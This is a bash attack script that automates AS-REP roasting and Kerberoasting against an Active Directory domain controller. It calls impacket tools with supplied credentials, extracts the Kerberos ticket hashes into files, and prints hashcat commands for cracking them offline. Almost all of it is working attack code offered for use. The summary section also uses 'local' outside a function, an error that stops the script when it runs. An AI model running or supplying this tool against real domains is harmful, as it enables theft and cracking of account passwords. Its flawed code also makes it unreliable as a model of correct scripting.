#!/usr/bin/env bash
# Author: strikoder
# File: auth_kerberos
# Usage: ./auth_kerberos <USERNAME> <PASSWORD> <DC_IP> <DOMAIN>
#
# Purpose:
#   Authenticated Kerberos attacks:
#   - AS-REP roasting (with credentials)
#   - Kerberoasting (GetUserSPNs)
#
# Output:
#   results_auth_kerberos/<DOMAIN>_<timestamp>/ with results
#
set -euo pipefail

# Color definitions
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly MAGENTA='\033[0;35m'
readonly NC='\033[0m' # No Color

USER="${1:-}"
PASS="${2:-}"
IP="${3:-}"
DOMAIN="${4:-}"

if [[ -z "${USER}" || -z "${PASS}" || -z "${IP}" || -z "${DOMAIN}" ]]; then
  echo -e "${RED}[!] Usage: $0 <USERNAME> <PASSWORD> <DC_IP> <DOMAIN>${NC}" >&2
  echo "Example: $0 pete 'Password123' 192.168.105.70 corp.com"
  exit 1
fi

section_header() {
    local title="$1"
    local width=60
    local padding=$(( (width - ${#title} - 2) / 2 ))
    echo
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo -e "${CYAN}$(printf ' %.0s' $(seq 1 $padding))${title}${NC}"
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo
}

log_info() {
    echo -e "${BLUE}[*]${NC} $*"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $*"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $*"
}

log_error() {
    echo -e "${RED}[-]${NC} $*"
}

clear
echo -e "${CYAN}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║         Authenticated Kerberos Attack Script              ║
║                   by strikoder                            ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo "Select mode:"
echo "  1) AS-REP roasting"
echo "  2) Kerberoasting"
echo "  3) Both attacks"
read -rp "Choice [1/2/3]: " MODE

echo ""
section_header "HINTS"
echo -e "${YELLOW}[!] Crack AS-REP hashes:${NC} hashcat -m 18200 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Crack Kerberoast hashes:${NC} hashcat -m 13100 hashes.txt wordlist.txt"
echo -e "${YELLOW}[!] Extract hashes:${NC} grep '\$krb5' file.log > hashes.txt"
echo ""

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTDIR="results_auth_kerberos/${DOMAIN}_${TIMESTAMP}"
mkdir -p "$OUTDIR"

log_info "Output directory: ${MAGENTA}${OUTDIR}${NC}"
log_info "Target: DC=${MAGENTA}${IP}${NC} | Domain=${MAGENTA}${DOMAIN}${NC} | User=${MAGENTA}${USER}${NC}"
echo ""

# AS-REP Roasting
asrep_roast() {
  local LOGFILE="$OUTDIR/asrep_roasting.log"
  local HASHFILE="$OUTDIR/asrep_hashes.txt"
  
  section_header "AS-REP ROASTING"
  
  log_info "Searching for AS-REP roastable accounts..."
  echo ""
  
  if impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
    echo ""
    # Extract hashes
    if grep -q '\$krb5asrep\$' "$LOGFILE" 2>/dev/null; then
      grep '\$krb5asrep\$' "$LOGFILE" > "$HASHFILE"
      local COUNT=$(wc -l < "$HASHFILE")
      log_success "Found ${GREEN}${COUNT}${NC} AS-REP roastable account(s)"
      log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
    else
      log_warning "No AS-REP roastable accounts found"
    fi
  else
    log_error "AS-REP roasting failed - check credentials or connectivity"
  fi
}

# Kerberoasting
kerberoast() {
  local LOGFILE="$OUTDIR/kerberoasting.log"
  local HASHFILE="$OUTDIR/kerberoast_hashes.txt"
  
  section_header "KERBEROASTING"
  
  log_info "Searching for Kerberoastable accounts (SPNs)..."
  echo ""
  
  if impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request 2>&1 | tee "$LOGFILE"; then
    echo ""
    # Extract hashes
    if grep -q '\$krb5tgs\$' "$LOGFILE" 2>/dev/null; then
      grep '\$krb5tgs\$' "$LOGFILE" > "$HASHFILE"
      local COUNT=$(wc -l < "$HASHFILE")
      log_success "Found ${GREEN}${COUNT}${NC} Kerberoastable account(s)"
      log_success "Hashes saved to: ${GREEN}${HASHFILE}${NC}"
    else
      log_warning "No Kerberoastable accounts found"
    fi
  else
    log_error "Kerberoasting failed - check credentials or connectivity"
  fi
}

# Execute selected mode
case "$MODE" in
  1)
    asrep_roast
    ;;
  2)
    kerberoast
    ;;
  3)
    asrep_roast
    kerberoast
    ;;
  *)
    log_error "Invalid mode"
    exit 1
    ;;
esac

section_header "ENUMERATION SUMMARY"

log_success "Results saved to: ${GREEN}${OUTDIR}/${NC}"
echo ""

# Summary with counts
local HAS_RESULTS=false
if [[ -f "$OUTDIR/asrep_hashes.txt" ]] && [[ -s "$OUTDIR/asrep_hashes.txt" ]]; then
  local ASREP_COUNT=$(wc -l < "$OUTDIR/asrep_hashes.txt")
  log_success "AS-REP hashes: ${GREEN}${ASREP_COUNT} found${NC} → ${OUTDIR}/asrep_hashes.txt"
  HAS_RESULTS=true
fi

if [[ -f "$OUTDIR/kerberoast_hashes.txt" ]] && [[ -s "$OUTDIR/kerberoast_hashes.txt" ]]; then
  local KERB_COUNT=$(wc -l < "$OUTDIR/kerberoast_hashes.txt")
  log_success "Kerberoast hashes: ${GREEN}${KERB_COUNT} found${NC} → ${OUTDIR}/kerberoast_hashes.txt"
  HAS_RESULTS=true
fi

if [[ "$HAS_RESULTS" = false ]]; then
  log_warning "No hashes found in this enumeration"
fi

echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  → Crack AS-REP hashes: hashcat -m 18200 asrep_hashes.txt wordlist.txt"
echo "  → Crack Kerberoast hashes: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt"
echo ""
